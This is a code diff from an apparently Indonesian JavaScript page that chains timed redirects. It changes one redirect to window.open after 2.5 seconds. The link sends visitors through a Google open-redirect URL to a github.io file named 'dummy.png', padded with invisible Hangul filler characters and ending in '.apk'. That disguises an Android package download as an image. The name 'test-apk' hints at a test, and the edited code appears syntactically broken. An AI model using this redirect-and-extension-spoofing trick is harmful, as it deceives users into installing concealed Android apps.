@@ -28,9 +28,8 @@ function a() {
     // Step 2: redirect sangat cepat (±100 ms)
     setTimeout(function () {
         console.log("Redirect 1 after", Date.now() - start, "ms");
-        win.location.href =
-            'https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fdummy.png%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4.apk&sa=D&sntz=1&usg=AOvVaw1nf4doZk0mt44E5Tg0kXgh';
-             "_blank"
+           window.open('https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fdummy.png%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4%25E3%2585%25A4.apk&sa=D&sntz=1&usg=AOvVaw1nf4doZk0mt44E5Tg0kXgh', 'blank');
+    }, 2500);
         // Step 3: redirect berikutnya (opsional, 900 ms)
         setTimeout(function () {
             console.log("Redirect 2 after", Date.now() - start, "ms");
